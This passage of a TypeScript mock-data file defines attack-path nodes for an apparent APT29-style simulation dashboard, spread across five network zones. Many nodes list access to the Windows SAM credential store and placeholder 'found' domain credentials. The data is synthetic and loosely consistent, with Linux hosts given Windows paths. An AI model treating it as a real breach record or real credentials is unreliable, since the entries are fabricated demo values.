    {path_id:'s550EP-p2',path_name:'Cross-Zone Lateral Path',path_color:'#ff9800',node_ids:['s550EP-ep01','s550EP-ep02','s550EP-ep04','s550EP-ep07','s550EP-ep09','s550EP-ep13','s550EP-ep17','s550EP-ep20','s550EP-ep23','s550EP-ep27','s550EP-ep32','s550EP-ep34','s550EP-ep38','s550EP-ep41','s550EP-ep45','s550EP-ep48'],path_outcome:'success'},
    {path_id:'s550EP-p3',path_name:'Blocked Attempt',path_color:'#9c27b0',node_ids:['s550EP-ep01','s550EP-ep10','s550EP-ep11','s550EP-ep24'],path_outcome:'failed', path_fail_reason:'PREVENTED by security control', failed_from_node_id:'s550EP-ep24'},
  ],
};
// ══════════════════════════════════════════════════════════════
// APT29 Scale — 100 Endpoints, 5 zones
// ══════════════════════════════════════════════════════════════

export const MOCK_SCENARIO_APT_90EP: AttackPathData = {
  attack_path_nodes: [
    // ── ASSET nodes (90 total, 47 in paths) ──
    { node_id:'s6_90EP-ep01', node_type:'ASSET', node_label:'WEB-01', node_hostname:'WEB-01',
      node_ip:'10.0.0.10', node_platform:'Windows Server 2019',
      node_status:'undetected',
      node_zone:'External DMZ', node_subnet:'10.0.0.0/24',
      node_is_entry_point:true,
      node_accessed_files:['C:\\Logs\\WEB-01-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\web-01:$ecr3t#1!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s6_90EP-ep02', node_type:'ASSET', node_label:'APP-02', node_hostname:'APP-02',
      node_ip:'10.0.0.11', node_platform:'Windows Server 2022',
      node_status:'undetected',
      node_zone:'External DMZ', node_subnet:'10.0.0.0/24',
      node_accessed_files:['C:\\Logs\\APP-02-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\app-02:$ecr3t#2!'],
    node_agents:['sentinel_one'],
    },
    { node_id:'s6_90EP-ep03', node_type:'ASSET', node_label:'DB-03', node_hostname:'DB-03',
      node_ip:'10.0.0.12', node_platform:'Windows 10',
      node_status:'detected',
      node_zone:'External DMZ', node_subnet:'10.0.0.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\DB-03-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\db-03:$ecr3t#3!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s6_90EP-ep04', node_type:'ASSET', node_label:'FILE-04', node_hostname:'FILE-04',
      node_ip:'10.0.0.13', node_platform:'Windows 11',
      node_status:'undetected',
      node_zone:'External DMZ', node_subnet:'10.0.0.0/24',
    node_agents:['palo_alto'],
    },
    { node_id:'s6_90EP-ep05', node_type:'ASSET', node_label:'MAIL-05', node_hostname:'MAIL-05',
      node_ip:'10.0.0.14', node_platform:'Ubuntu 22.04 LTS',
      node_status:'undetected',
      node_zone:'External DMZ', node_subnet:'10.0.0.0/24',
      node_accessed_files:['C:\\Logs\\MAIL-05-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\mail-05:$ecr3t#5!'],
    node_agents:['palo_alto'],
    },
    { node_id:'s6_90EP-ep06', node_type:'ASSET', node_label:'JUMP-06', node_hostname:'JUMP-06',
      node_ip:'10.0.0.15', node_platform:'Ubuntu 20.04 LTS',
      node_untouched:true, node_status:'pending',
      node_zone:'External DMZ', node_subnet:'10.0.0.0/24',
    node_agents:['palo_alto'],
    },
    { node_id:'s6_90EP-ep07', node_type:'ASSET', node_label:'PRINT-07', node_hostname:'PRINT-07',
      node_ip:'10.0.0.16', node_platform:'CentOS 7',
      node_untouched:true, node_status:'pending',
      node_zone:'External DMZ', node_subnet:'10.0.0.0/24',
    node_agents:['openaev'],
    },
    { node_id:'s6_90EP-ep08', node_type:'ASSET', node_label:'DNS-08', node_hostname:'DNS-08',
      node_ip:'10.0.0.17', node_platform:'Red Hat 8',
      node_untouched:true, node_status:'pending',
      node_zone:'External DMZ', node_subnet:'10.0.0.0/24',
    node_agents:['sentinel_one'],
    },
    { node_id:'s6_90EP-ep09', node_type:'ASSET', node_label:'DC-09', node_hostname:'DC-09',
      node_ip:'10.0.0.18', node_platform:'Windows Server 2019',
      node_untouched:true, node_status:'pending',
      node_zone:'External DMZ', node_subnet:'10.0.0.0/24',
    node_agents:['openaev'],
    },
    { node_id:'s6_90EP-ep10', node_type:'ASSET', node_label:'WS-10', node_hostname:'WS-10',
      node_ip:'10.0.0.19', node_platform:'Windows Server 2022',
      node_untouched:true, node_status:'pending',
      node_zone:'External DMZ', node_subnet:'10.0.0.0/24',
    node_agents:['palo_alto'],
    },
    { node_id:'s6_90EP-ep11', node_type:'ASSET', node_label:'API-11', node_hostname:'API-11',
      node_ip:'10.0.0.20', node_platform:'Windows 10',
      node_untouched:true, node_status:'pending',
      node_zone:'External DMZ', node_subnet:'10.0.0.0/24',
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s6_90EP-ep12', node_type:'ASSET', node_label:'BACKUP-12', node_hostname:'BACKUP-12',
      node_ip:'10.0.0.21', node_platform:'Windows 11',
      node_untouched:true, node_status:'pending',
      node_zone:'External DMZ', node_subnet:'10.0.0.0/24',
    node_agents:['sentinel_one'],
    },
    { node_id:'s6_90EP-ep13', node_type:'ASSET', node_label:'MONITOR-13', node_hostname:'MONITOR-13',
      node_ip:'10.0.0.22', node_platform:'Ubuntu 22.04 LTS',
      node_untouched:true, node_status:'pending',
      node_zone:'External DMZ', node_subnet:'10.0.0.0/24',
    node_agents:['openaev'],
    },
    { node_id:'s6_90EP-ep14', node_type:'ASSET', node_label:'VPN-14', node_hostname:'VPN-14',
      node_ip:'10.0.0.23', node_platform:'Ubuntu 20.04 LTS',
      node_untouched:true, node_status:'pending',
      node_zone:'External DMZ', node_subnet:'10.0.0.0/24',
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s6_90EP-ep15', node_type:'ASSET', node_label:'FTP-15', node_hostname:'FTP-15',
      node_ip:'10.0.0.24', node_platform:'CentOS 7',
      node_untouched:true, node_status:'pending',
      node_zone:'External DMZ', node_subnet:'10.0.0.0/24',
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s6_90EP-ep16', node_type:'ASSET', node_label:'PROXY-16', node_hostname:'PROXY-16',
      node_ip:'10.0.0.25', node_platform:'Red Hat 8',
      node_untouched:true, node_status:'pending',
      node_zone:'External DMZ', node_subnet:'10.0.0.0/24',
    node_agents:['sentinel_one'],
    },
    { node_id:'s6_90EP-ep17', node_type:'ASSET', node_label:'SIEM-17', node_hostname:'SIEM-17',
      node_ip:'10.0.0.26', node_platform:'Windows Server 2019',
      node_untouched:true, node_status:'pending',
      node_zone:'External DMZ', node_subnet:'10.0.0.0/24',
    node_agents:['openaev'],
    },
    { node_id:'s6_90EP-ep18', node_type:'ASSET', node_label:'LDAP-18', node_hostname:'LDAP-18',
      node_ip:'10.0.0.27', node_platform:'Windows Server 2022',
      node_untouched:true, node_status:'pending',
      node_zone:'External DMZ', node_subnet:'10.0.0.0/24',
    node_agents:['openaev'],
    },
    { node_id:'s6_90EP-ep19', node_type:'ASSET', node_label:'MGMT-19', node_hostname:'MGMT-19',
      node_ip:'10.0.1.10', node_platform:'Windows 10',
      node_status:'undetected',
      node_zone:'Perimeter Network', node_subnet:'10.0.1.0/24',
      node_accessed_files:['C:\\Logs\\MGMT-19-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\mgmt-19:$ecr3t#19!'],
    node_agents:['palo_alto'],
    },
    { node_id:'s6_90EP-ep20', node_type:'ASSET', node_label:'DEV-20', node_hostname:'DEV-20',
      node_ip:'10.0.1.11', node_platform:'Windows 11',
      node_status:'detected',
      node_zone:'Perimeter Network', node_subnet:'10.0.1.0/24',
      node_accessed_files:['C:\\Logs\\DEV-20-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\dev-20:$ecr3t#20!'],
    node_agents:['sentinel_one'],
    },
    { node_id:'s6_90EP-ep21', node_type:'ASSET', node_label:'WEB-21', node_hostname:'WEB-21',
      node_ip:'10.0.1.12', node_platform:'Ubuntu 22.04 LTS',
      node_status:'undetected',
      node_zone:'Perimeter Network', node_subnet:'10.0.1.0/24',
      node_accessed_files:['C:\\Logs\\WEB-21-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\web-21:$ecr3t#21!'],
    node_agents:['openaev'],
    },
    { node_id:'s6_90EP-ep22', node_type:'ASSET', node_label:'APP-22', node_hostname:'APP-22',
      node_ip:'10.0.1.13', node_platform:'Ubuntu 20.04 LTS',
      node_status:'undetected',
      node_zone:'Perimeter Network', node_subnet:'10.0.1.0/24',
      node_accessed_files:['C:\\Logs\\APP-22-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\app-22:$ecr3t#22!'],
    node_agents:['sentinel_one'],
    },
    { node_id:'s6_90EP-ep23', node_type:'ASSET', node_label:'DB-23', node_hostname:'DB-23',
      node_ip:'10.0.1.14', node_platform:'CentOS 7',
      node_status:'undetected',
      node_zone:'Perimeter Network', node_subnet:'10.0.1.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\DB-23-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\db-23:$ecr3t#23!'],
    node_agents:['palo_alto', 'openaev'],
    },
    { node_id:'s6_90EP-ep24', node_type:'ASSET', node_label:'FILE-24', node_hostname:'FILE-24',
      node_ip:'10.0.1.15', node_platform:'Red Hat 8',
      node_status:'undetected',
      node_zone:'Perimeter Network', node_subnet:'10.0.1.0/24',
      node_accessed_files:['C:\\Logs\\FILE-24-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\file-24:$ecr3t#24!'],
    node_agents:['openaev'],
    },
    { node_id:'s6_90EP-ep25', node_type:'ASSET', node_label:'MAIL-25', node_hostname:'MAIL-25',
      node_ip:'10.0.1.16', node_platform:'Windows Server 2019',
      node_status:'undetected',
      node_zone:'Perimeter Network', node_subnet:'10.0.1.0/24',
      node_accessed_files:['C:\\Logs\\MAIL-25-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\mail-25:$ecr3t#25!'],
    node_agents:['openaev'],
    },
    { node_id:'s6_90EP-ep26', node_type:'ASSET', node_label:'JUMP-26', node_hostname:'JUMP-26',
      node_ip:'10.0.1.17', node_platform:'Windows Server 2022',
      node_status:'detected',
      node_zone:'Perimeter Network', node_subnet:'10.0.1.0/24',
      node_accessed_files:['C:\\Logs\\JUMP-26-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\jump-26:$ecr3t#26!'],
    node_agents:['sentinel_one'],
    },
    { node_id:'s6_90EP-ep27', node_type:'ASSET', node_label:'PRINT-27', node_hostname:'PRINT-27',
      node_ip:'10.0.1.18', node_platform:'Windows 10',
      node_status:'undetected',
      node_zone:'Perimeter Network', node_subnet:'10.0.1.0/24',
      node_accessed_files:['C:\\Logs\\PRINT-27-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\print-27:$ecr3t#27!'],
    node_agents:['palo_alto'],
    },
    { node_id:'s6_90EP-ep28', node_type:'ASSET', node_label:'DNS-28', node_hostname:'DNS-28',
      node_ip:'10.0.1.19', node_platform:'Windows 11',
      node_untouched:true, node_status:'pending',
      node_zone:'Perimeter Network', node_subnet:'10.0.1.0/24',
    node_agents:['palo_alto'],
    },
    { node_id:'s6_90EP-ep29', node_type:'ASSET', node_label:'DC-29', node_hostname:'DC-29',
      node_ip:'10.0.1.20', node_platform:'Ubuntu 22.04 LTS',
      node_untouched:true, node_status:'pending',
      node_zone:'Perimeter Network', node_subnet:'10.0.1.0/24',
    node_agents:['palo_alto'],
    },
    { node_id:'s6_90EP-ep30', node_type:'ASSET', node_label:'WS-30', node_hostname:'WS-30',
      node_ip:'10.0.1.21', node_platform:'Ubuntu 20.04 LTS',
      node_untouched:true, node_status:'pending',
      node_zone:'Perimeter Network', node_subnet:'10.0.1.0/24',
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s6_90EP-ep31', node_type:'ASSET', node_label:'API-31', node_hostname:'API-31',
      node_ip:'10.0.1.22', node_platform:'CentOS 7',
      node_untouched:true, node_status:'pending',
      node_zone:'Perimeter Network', node_subnet:'10.0.1.0/24',
    node_agents:['sentinel_one'],
    },
    { node_id:'s6_90EP-ep32', node_type:'ASSET', node_label:'BACKUP-32', node_hostname:'BACKUP-32',
      node_ip:'10.0.1.23', node_platform:'Red Hat 8',
      node_untouched:true, node_status:'pending',
      node_zone:'Perimeter Network', node_subnet:'10.0.1.0/24',
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s6_90EP-ep33', node_type:'ASSET', node_label:'MONITOR-33', node_hostname:'MONITOR-33',
      node_ip:'10.0.1.24', node_platform:'Windows Server 2019',
      node_untouched:true, node_status:'pending',
      node_zone:'Perimeter Network', node_subnet:'10.0.1.0/24',
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s6_90EP-ep34', node_type:'ASSET', node_label:'VPN-34', node_hostname:'VPN-34',
      node_ip:'10.0.1.25', node_platform:'Windows Server 2022',
      node_untouched:true, node_status:'pending',
      node_zone:'Perimeter Network', node_subnet:'10.0.1.0/24',
    node_agents:['openaev'],
    },
    { node_id:'s6_90EP-ep35', node_type:'ASSET', node_label:'FTP-35', node_hostname:'FTP-35',
      node_ip:'10.0.1.26', node_platform:'Windows 10',
      node_untouched:true, node_status:'pending',
      node_zone:'Perimeter Network', node_subnet:'10.0.1.0/24',
    node_agents:['openaev'],
    },
    { node_id:'s6_90EP-ep36', node_type:'ASSET', node_label:'PROXY-36', node_hostname:'PROXY-36',
      node_ip:'10.0.1.27', node_platform:'Windows 11',
      node_untouched:true, node_status:'pending',
      node_zone:'Perimeter Network', node_subnet:'10.0.1.0/24',
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s6_90EP-ep37', node_type:'ASSET', node_label:'SIEM-37', node_hostname:'SIEM-37',
      node_ip:'192.168.1.10', node_platform:'Ubuntu 22.04 LTS',
      node_status:'undetected',
      node_zone:'Internal LAN', node_subnet:'192.168.1.0/24',
      node_accessed_files:['C:\\Logs\\SIEM-37-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\siem-37:$ecr3t#37!'],
    node_agents:['palo_alto'],
    },
    { node_id:'s6_90EP-ep38', node_type:'ASSET', node_label:'LDAP-38', node_hostname:'LDAP-38',
      node_ip:'192.168.1.11', node_platform:'Ubuntu 20.04 LTS',
      node_status:'undetected',
      node_zone:'Internal LAN', node_subnet:'192.168.1.0/24',
      node_accessed_files:['C:\\Logs\\LDAP-38-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\ldap-38:$ecr3t#38!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s6_90EP-ep39', node_type:'ASSET', node_label:'MGMT-39', node_hostname:'MGMT-39',
      node_ip:'192.168.1.12', node_platform:'CentOS 7',
      node_status:'detected',
      node_zone:'Internal LAN', node_subnet:'192.168.1.0/24',
      node_accessed_files:['C:\\Logs\\MGMT-39-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\mgmt-39:$ecr3t#39!'],
    node_agents:['sentinel_one'],
    },
    { node_id:'s6_90EP-ep40', node_type:'ASSET', node_label:'DEV-40', node_hostname:'DEV-40',
      node_ip:'192.168.1.13', node_platform:'Red Hat 8',
      node_status:'undetected',
      node_zone:'Internal LAN', node_subnet:'192.168.1.0/24',
      node_accessed_files:['C:\\Logs\\DEV-40-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\dev-40:$ecr3t#40!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s6_90EP-ep41', node_type:'ASSET', node_label:'WEB-41', node_hostname:'WEB-41',
      node_ip:'192.168.1.14', node_platform:'Windows Server 2019',
      node_status:'undetected',
      node_zone:'Internal LAN', node_subnet:'192.168.1.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\WEB-41-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\web-41:$ecr3t#41!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s6_90EP-ep42', node_type:'ASSET', node_label:'APP-42', node_hostname:'APP-42',
      node_ip:'192.168.1.15', node_platform:'Windows Server 2022',
      node_status:'undetected',
      node_zone:'Internal LAN', node_subnet:'192.168.1.0/24',
      node_accessed_files:['C:\\Logs\\APP-42-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\app-42:$ecr3t#42!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s6_90EP-ep43', node_type:'ASSET', node_label:'DB-43', node_hostname:'DB-43',
      node_ip:'192.168.1.16', node_platform:'Windows 10',
      node_status:'undetected',
      node_zone:'Internal LAN', node_subnet:'192.168.1.0/24',
      node_accessed_files:['C:\\Logs\\DB-43-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\db-43:$ecr3t#43!'],
    node_agents:['openaev'],
    },
    { node_id:'s6_90EP-ep44', node_type:'ASSET', node_label:'FILE-44', node_hostname:'FILE-44',
      node_ip:'192.168.1.17', node_platform:'Windows 11',
      node_status:'undetected',
      node_zone:'Internal LAN', node_subnet:'192.168.1.0/24',
      node_accessed_files:['C:\\Logs\\FILE-44-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\file-44:$ecr3t#44!'],
    node_agents:['palo_alto'],
    },
    { node_id:'s6_90EP-ep45', node_type:'ASSET', node_label:'MAIL-45', node_hostname:'MAIL-45',
      node_ip:'192.168.1.18', node_platform:'Ubuntu 22.04 LTS',
      node_status:'undetected',
      node_zone:'Internal LAN', node_subnet:'192.168.1.0/24',
      node_accessed_files:['C:\\Logs\\MAIL-45-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\mail-45:$ecr3t#45!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s6_90EP-ep46', node_type:'ASSET', node_label:'JUMP-46', node_hostname:'JUMP-46',
      node_ip:'192.168.1.19', node_platform:'Ubuntu 20.04 LTS',
      node_status:'undetected',
      node_zone:'Internal LAN', node_subnet:'192.168.1.0/24',
      node_accessed_files:['C:\\Logs\\JUMP-46-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\jump-46:$ecr3t#46!'],
    node_agents:['sentinel_one'],
    },
    { node_id:'s6_90EP-ep47', node_type:'ASSET', node_label:'PRINT-47', node_hostname:'PRINT-47',
      node_ip:'192.168.1.20', node_platform:'CentOS 7',
      node_status:'undetected',
      node_zone:'Internal LAN', node_subnet:'192.168.1.0/24',
      node_accessed_files:['C:\\Logs\\PRINT-47-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\print-47:$ecr3t#47!'],
    node_agents:['palo_alto'],
    },
    { node_id:'s6_90EP-ep48', node_type:'ASSET', node_label:'DNS-48', node_hostname:'DNS-48',
      node_ip:'192.168.1.21', node_platform:'Red Hat 8',
      node_untouched:true, node_status:'pending',
      node_zone:'Internal LAN', node_subnet:'192.168.1.0/24',
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s6_90EP-ep49', node_type:'ASSET', node_label:'DC-49', node_hostname:'DC-49',
      node_ip:'192.168.1.22', node_platform:'Windows Server 2019',
      node_untouched:true, node_status:'pending',
      node_zone:'Internal LAN', node_subnet:'192.168.1.0/24',
    node_agents:['sentinel_one'],
    },
    { node_id:'s6_90EP-ep50', node_type:'ASSET', node_label:'WS-50', node_hostname:'WS-50',
      node_ip:'192.168.1.23', node_platform:'Windows Server 2022',
      node_untouched:true, node_status:'pending',
      node_zone:'Internal LAN', node_subnet:'192.168.1.0/24',
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s6_90EP-ep51', node_type:'ASSET', node_label:'API-51', node_hostname:'API-51',
      node_ip:'192.168.1.24', node_platform:'Windows 10',
      node_untouched:true, node_status:'pending',
      node_zone:'Internal LAN', node_subnet:'192.168.1.0/24',
    node_agents:['openaev'],
    },
    { node_id:'s6_90EP-ep52', node_type:'ASSET', node_label:'BACKUP-52', node_hostname:'BACKUP-52',
      node_ip:'192.168.1.25', node_platform:'Windows 11',
      node_untouched:true, node_status:'pending',
      node_zone:'Internal LAN', node_subnet:'192.168.1.0/24',
    node_agents:['openaev'],
    },
    { node_id:'s6_90EP-ep53', node_type:'ASSET', node_label:'MONITOR-53', node_hostname:'MONITOR-53',
      node_ip:'192.168.1.26', node_platform:'Ubuntu 22.04 LTS',
      node_untouched:true, node_status:'pending',
      node_zone:'Internal LAN', node_subnet:'192.168.1.0/24',
    node_agents:['sentinel_one'],
    },
    { node_id:'s6_90EP-ep54', node_type:'ASSET', node_label:'VPN-54', node_hostname:'VPN-54',
      node_ip:'192.168.1.27', node_platform:'Ubuntu 20.04 LTS',
      node_untouched:true, node_status:'pending',
      node_zone:'Internal LAN', node_subnet:'192.168.1.0/24',
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s6_90EP-ep55', node_type:'ASSET', node_label:'FTP-55', node_hostname:'FTP-55',
      node_ip:'192.168.2.10', node_platform:'CentOS 7',
      node_status:'undetected',
      node_zone:'Secure Segment', node_subnet:'192.168.2.0/24',
      node_accessed_files:['C:\\Logs\\FTP-55-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\ftp-55:$ecr3t#55!'],
    node_agents:['palo_alto'],
    },
    { node_id:'s6_90EP-ep56', node_type:'ASSET', node_label:'PROXY-56', node_hostname:'PROXY-56',
      node_ip:'192.168.2.11', node_platform:'Red Hat 8',
      node_status:'detected',
      node_zone:'Secure Segment', node_subnet:'192.168.2.0/24',
      node_accessed_files:['C:\\Logs\\PROXY-56-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\proxy-56:$ecr3t#56!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s6_90EP-ep57', node_type:'ASSET', node_label:'SIEM-57', node_hostname:'SIEM-57',
      node_ip:'192.168.2.12', node_platform:'Windows Server 2019',
      node_status:'undetected',
      node_zone:'Secure Segment', node_subnet:'192.168.2.0/24',
      node_accessed_files:['C:\\Logs\\SIEM-57-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\siem-57:$ecr3t#57!'],
    node_agents:['sentinel_one'],
    },
    { node_id:'s6_90EP-ep58', node_type:'ASSET', node_label:'LDAP-58', node_hostname:'LDAP-58',
      node_ip:'192.168.2.13', node_platform:'Windows Server 2022',
      node_status:'detected',
      node_zone:'Secure Segment', node_subnet:'192.168.2.0/24',
      node_accessed_files:['C:\\Logs\\LDAP-58-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\ldap-58:$ecr3t#58!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s6_90EP-ep59', node_type:'ASSET', node_label:'MGMT-59', node_hostname:'MGMT-59',
      node_ip:'192.168.2.14', node_platform:'Windows 10',
      node_status:'undetected',
      node_zone:'Secure Segment', node_subnet:'192.168.2.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\MGMT-59-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\mgmt-59:$ecr3t#59!'],
    node_agents:['palo_alto', 'sentinel_one', 'openaev'],
    },
    { node_id:'s6_90EP-ep60', node_type:'ASSET', node_label:'DEV-60', node_hostname:'DEV-60',
      node_ip:'192.168.2.15', node_platform:'Windows 11',
      node_status:'undetected',
      node_zone:'Secure Segment', node_subnet:'192.168.2.0/24',
      node_accessed_files:['C:\\Logs\\DEV-60-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\dev-60:$ecr3t#60!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s6_90EP-ep61', node_type:'ASSET', node_label:'WEB-61', node_hostname:'WEB-61',
      node_ip:'192.168.2.16', node_platform:'Ubuntu 22.04 LTS',
      node_status:'undetected',
      node_zone:'Secure Segment', node_subnet:'192.168.2.0/24',
      node_accessed_files:['C:\\Logs\\WEB-61-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\web-61:$ecr3t#61!'],
    node_agents:['sentinel_one'],
    },
    { node_id:'s6_90EP-ep62', node_type:'ASSET', node_label:'APP-62', node_hostname:'APP-62',
      node_ip:'192.168.2.17', node_platform:'Ubuntu 20.04 LTS',
      node_status:'undetected',
      node_zone:'Secure Segment', node_subnet:'192.168.2.0/24',
      node_accessed_files:['C:\\Logs\\APP-62-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\app-62:$ecr3t#62!'],
    node_agents:['palo_alto'],
    },
    { node_id:'s6_90EP-ep63', node_type:'ASSET', node_label:'DB-63', node_hostname:'DB-63',
      node_ip:'192.168.2.18', node_platform:'CentOS 7',
      node_status:'detected',
      node_zone:'Secure Segment', node_subnet:'192.168.2.0/24',
      node_accessed_files:['C:\\Logs\\DB-63-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\db-63:$ecr3t#63!'],
    node_agents:['palo_alto'],
    },
    { node_id:'s6_90EP-ep64', node_type:'ASSET', node_label:'FILE-64', node_hostname:'FILE-64',
      node_ip:'192.168.2.19', node_platform:'Red Hat 8',
      node_status:'undetected',
      node_zone:'Secure Segment', node_subnet:'192.168.2.0/24',
      node_accessed_files:['C:\\Logs\\FILE-64-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\file-64:$ecr3t#64!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s6_90EP-ep65', node_type:'ASSET', node_label:'MAIL-65', node_hostname:'MAIL-65',
      node_ip:'192.168.2.20', node_platform:'Windows Server 2019',
      node_status:'undetected',
      node_zone:'Secure Segment', node_subnet:'192.168.2.0/24',
      node_accessed_files:['C:\\Logs\\MAIL-65-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\mail-65:$ecr3t#65!'],
    node_agents:['sentinel_one'],
    },
    { node_id:'s6_90EP-ep66', node_type:'ASSET', node_label:'JUMP-66', node_hostname:'JUMP-66',
      node_ip:'192.168.2.21', node_platform:'Windows Server 2022',
      node_status:'undetected',
      node_zone:'Secure Segment', node_subnet:'192.168.2.0/24',
      node_accessed_files:['C:\\Logs\\JUMP-66-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\jump-66:$ecr3t#66!'],
    node_agents:['palo_alto'],
    },
    { node_id:'s6_90EP-ep67', node_type:'ASSET', node_label:'PRINT-67', node_hostname:'PRINT-67',
      node_ip:'192.168.2.22', node_platform:'Windows 10',
      node_untouched:true, node_status:'pending',
      node_zone:'Secure Segment', node_subnet:'192.168.2.0/24',
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s6_90EP-ep68', node_type:'ASSET', node_label:'DNS-68', node_hostname:'DNS-68',
      node_ip:'192.168.2.23', node_platform:'Windows 11',
      node_untouched:true, node_status:'pending',
      node_zone:'Secure Segment', node_subnet:'192.168.2.0/24',
    node_agents:['openaev'],
    },
    { node_id:'s6_90EP-ep69', node_type:'ASSET', node_label:'DC-69', node_hostname:'DC-69',
      node_ip:'192.168.2.24', node_platform:'Ubuntu 22.04 LTS',
      node_untouched:true, node_status:'pending',
      node_zone:'Secure Segment', node_subnet:'192.168.2.0/24',
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s6_90EP-ep70', node_type:'ASSET', node_label:'WS-70', node_hostname:'WS-70',
      node_ip:'192.168.2.25', node_platform:'Ubuntu 20.04 LTS',
      node_untouched:true, node_status:'pending',
      node_zone:'Secure Segment', node_subnet:'192.168.2.0/24',
    node_agents:['openaev'],
    },
    { node_id:'s6_90EP-ep71', node_type:'ASSET', node_label:'API-71', node_hostname:'API-71',
      node_ip:'192.168.2.26', node_platform:'CentOS 7',
      node_untouched:true, node_status:'pending',
      node_zone:'Secure Segment', node_subnet:'192.168.2.0/24',
    node_agents:['palo_alto'],
    },
    { node_id:'s6_90EP-ep72', node_type:'ASSET', node_label:'BACKUP-72', node_hostname:'BACKUP-72',
      node_ip:'192.168.2.27', node_platform:'Red Hat 8',
      node_untouched:true, node_status:'pending',
      node_zone:'Secure Segment', node_subnet:'192.168.2.0/24',
    node_agents:['palo_alto'],
    },
    { node_id:'s6_90EP-ep73', node_type:'ASSET', node_label:'MONITOR-73', node_hostname:'MONITOR-73',
      node_ip:'10.10.0.10', node_platform:'Windows Server 2019',
      node_status:'detected',
      node_zone:'Domain Core', node_subnet:'10.10.0.0/24',
      node_accessed_files:['C:\\Logs\\MONITOR-73-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\monitor-73:$ecr3t#73!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s6_90EP-ep74', node_type:'ASSET', node_label:'VPN-74', node_hostname:'VPN-74',
      node_ip:'10.10.0.11', node_platform:'Windows Server 2022',
      node_status:'undetected',
      node_zone:'Domain Core', node_subnet:'10.10.0.0/24',
      node_accessed_files:['C:\\Logs\\VPN-74-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\vpn-74:$ecr3t#74!'],
    node_agents:['palo_alto', 'openaev'],
    },
    { node_id:'s6_90EP-ep75', node_type:'ASSET', node_label:'FTP-75', node_hostname:'FTP-75',
      node_ip:'10.10.0.12', node_platform:'Windows 10',
      node_status:'detected',
